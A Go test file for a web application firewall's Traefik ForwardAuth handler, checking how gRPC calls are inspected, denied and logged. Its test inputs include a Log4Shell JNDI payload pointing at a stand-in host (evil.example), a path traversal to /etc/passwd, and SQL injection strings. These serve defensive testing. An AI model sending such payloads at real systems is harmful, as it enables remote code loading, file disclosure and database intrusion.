// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package forwardauth

import (
	"bytes"
	"context"
	"encoding/binary"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/grpc/health/grpc_health_v1"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
)

// grpcMessages frames each message as gRPC does: a compressed flag, a
// 4-byte length, the message. Each message is a protobuf string field 1.
func grpcMessages(names ...string) string {
	var b []byte
	for _, n := range names {
		msg := append([]byte{0x0a, byte(len(n))}, n...)
		b = append(b, 0, 0, 0, 0, 0)
		binary.BigEndian.PutUint32(b[len(b)-4:], uint32(len(msg)))
		b = append(b, msg...)
	}
	return string(b)
}

// grpcSubrequest is what Traefik's ForwardAuth sends for a gRPC call (h2c
// to Traefik): the client's gRPC headers and its body.
func grpcSubrequest(uri, body string, kv ...string) *http.Request {
	r := subrequest("POST", uri, "application/grpc", body)
	r.Header.Set("User-Agent", "grpc-go/1.75.0")
	r.Header.Del("Accept")
	r.Header.Set("Te", "trailers")
	r.Header.Set("Grpc-Timeout", "9998m")
	for i := 0; i+1 < len(kv); i += 2 {
		r.Header.Add(kv[i], kv[i+1])
	}
	return r
}

// TestGRPC: gRPC calls through Traefik's ForwardAuth, with the embedded
// CRS. Before v0.3.1 they were all denied in block mode (920420, and 920270
// and 921150 on the binary body) and logged in detect mode.
func TestGRPC(t *testing.T) {
	const limit = 64
	stream := grpcMessages("alpha", "beta", "gamma", "delta", "epsilon", "zeta", "eta", "theta", "iota")
	tests := []struct {
		name string
		req  func() *http.Request
		want int
	}{
		{"unary", func() *http.Request { return grpcSubrequest("/helloworld.Greeter/SayHello", grpcMessages("world")) }, http.StatusOK},
		{"client stream", func() *http.Request {
			return grpcSubrequest("/routeguide.RouteGuide/RecordRoute", grpcMessages("a", "b", "c"))
		}, http.StatusOK},
		// Over the limit: a gRPC body isn't inspected, so it isn't
		// oversized either.
		{"client stream over the limit", func() *http.Request { return grpcSubrequest("/routeguide.RouteGuide/RecordRoute", stream) }, http.StatusOK},
		{"attack in metadata", func() *http.Request {
			return grpcSubrequest("/helloworld.Greeter/SayHello", grpcMessages("world"), "X-Api-Key", "${jndi:ldap://evil.example/a}")
		}, http.StatusForbidden},
		{"attack in the path", func() *http.Request {
			return grpcSubrequest("/helloworld.Greeter/../../../../etc/passwd", grpcMessages("world"))
		}, http.StatusForbidden},
		// A JSON body only labelled gRPC is inspected as before.
		{"json labelled grpc", func() *http.Request {
			return grpcSubrequest("/api/search", `{"q":"1' OR '1'='1' -- "}`)
		}, http.StatusForbidden},
	}
	for _, mode := range []pipeline.Mode{pipeline.ModeBlock, pipeline.ModeDetect} {
		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				var logs bytes.Buffer
				h := newHandler(t, mode, limit, &logs)
				want := tt.want
				if mode == pipeline.ModeDetect {
					want = http.StatusOK
				}
				if w := serve(h, tt.req()); w.Code != want {
					t.Fatalf("mode %d: got %d, want %d; events: %s", mode, w.Code, want, logs.String())
				}
				if logged := strings.Contains(logs.String(), "security event"); logged != (tt.want != http.StatusOK) {
					t.Fatalf("mode %d: events %q, want one only for an attack", mode, logs.String())
				}
			})
		}
	}
}

// TestGRPCDenial: a denied gRPC call is answered with the verdict's
// status, which Traefik needs to deny it, and the gRPC status in the
// headers: grpc-status 7 (PERMISSION_DENIED) and a grpc-message, with a
// gRPC content type and no body. Before, it was a plain-text 403.
func TestGRPCDenial(t *testing.T) {
	tests := []struct {
		contentType string
		want        string
	}{
		{"application/grpc", "application/grpc"},
		{"application/grpc+proto", "application/grpc"},
		{"application/grpc-web+proto", "application/grpc-web"},
		{"application/grpc-web-text", "application/grpc-web-text"},
	}
	for _, tt := range tests {
		t.Run(tt.contentType, func(t *testing.T) {
			var logs bytes.Buffer
			h := newHandler(t, pipeline.ModeBlock, 64, &logs)
			r := grpcSubrequest("/helloworld.Greeter/SayHello", grpcMessages("world"), "X-Api-Key", "${jndi:ldap://evil.example/a}")
			r.Header.Set("Content-Type", tt.contentType)
			r.Header.Set("X-Request-Id", "traefik-id-1")
			w := serve(h, r)
			if w.Code != http.StatusForbidden {
				t.Fatalf("status %d, want 403", w.Code)
			}
			want := map[string]string{
				"Content-Type": tt.want,
				"Grpc-Status":  "7",
				"Grpc-Message": "Forbidden (request ID traefik-id-1)",
				"X-Request-Id": "traefik-id-1",
			}
			for k, v := range want {
				if got := w.Header().Get(k); got != v {
					t.Errorf("%s %q, want %q", k, got, v)
				}
			}
			if w.Body.Len() != 0 {
				t.Errorf("body %q, want none", w.Body.String())
			}
		})
	}

	// Anything else is answered as before.
	var logs bytes.Buffer
	h := newHandler(t, pipeline.ModeBlock, 64, &logs)
	w := serve(h, subrequest("GET", "/?id=1%27%20OR%20%271%27%3D%271", "", ""))
	if w.Code != http.StatusForbidden || w.Header().Get("Grpc-Status") != "" ||
		w.Header().Get("Content-Type") != "text/plain; charset=utf-8" || w.Body.String() != "Forbidden\n" {
		t.Fatalf("HTTP denial %d %v %q", w.Code, w.Header(), w.Body.String())
	}
}

// traefik is a fake Traefik in front of the handler, speaking h2c to
// clients: it asks the handler, as ForwardAuth does, and answers a call it
// allows itself. A denial is copied to the client as ForwardAuth does: the
// headers, the status, the body.
func traefik(t *testing.T, auth http.Handler) string {
	t.Helper()
	srv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		sub := subrequest(r.Method, r.URL.RequestURI(), r.Header.Get("Content-Type"), string(body))
		for k, vs := range r.Header {
			sub.Header[k] = vs
		}
		resp := serve(auth, sub)
		if resp.Code >= 200 && resp.Code < 300 {
			// The upstream: an empty HealthCheckResponse is SERVING's
			// zero value, UNKNOWN; the call's status is what counts.
			w.Header().Set("Content-Type", "application/grpc")
			w.Header().Set("Trailer", "Grpc-Status")
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte{0, 0, 0, 0, 0})
			w.Header().Set("Grpc-Status", "0")
			return
		}
		for k, vs := range resp.Header() {
			w.Header()[k] = vs
		}
		w.WriteHeader(resp.Code)
		_, _ = w.Write(resp.Body.Bytes())
	}))
	srv.Config.Protocols = new(http.Protocols)
	srv.Config.Protocols.SetUnencryptedHTTP2(true)
	srv.Start()
	t.Cleanup(srv.Close)
	return srv.Listener.Addr().String()
}

// grpcCheck makes a grpc.health.v1.Health/Check call to addr, with
// metadata, and returns its status.
func grpcCheck(t *testing.T, addr string, md ...string) *status.Status {
	t.Helper()
	conn, err := grpc.NewClient("passthrough:///"+addr, grpc.WithTransportCredentials(insecure.NewCredentials()),
		grpc.WithContextDialer(func(ctx context.Context, a string) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, "tcp", a)
		}))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = conn.Close() }()
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	ctx = metadata.AppendToOutgoingContext(ctx, md...)
	_, err = grpc_health_v1.NewHealthClient(conn).Check(ctx, &grpc_health_v1.HealthCheckRequest{})
	return status.Convert(err)
}

// TestGRPCClient: a gRPC client behind (a fake) Traefik gets
// PERMISSION_DENIED with the engine's message. Before, it got
// PERMISSION_DENIED too, from the HTTP status, with a message about an
// unexpected HTTP status and content type.
func TestGRPCClient(t *testing.T) {
	var logs bytes.Buffer
	addr := traefik(t, newHandler(t, pipeline.ModeBlock, 1<<10, &logs))
	if st := grpcCheck(t, addr, "x-request-id", "client-id-1"); st.Code() != codes.OK {
		t.Fatalf("clean call: %v", st)
	}
	st := grpcCheck(t, addr, "x-api-key", "${jndi:ldap://evil.example/a}", "x-request-id", "client-id-2")
	if st.Code() != codes.PermissionDenied || st.Message() != "Forbidden (request ID client-id-2)" {
		t.Fatalf("attack: %v, want PermissionDenied with the engine's message", st)
	}
}
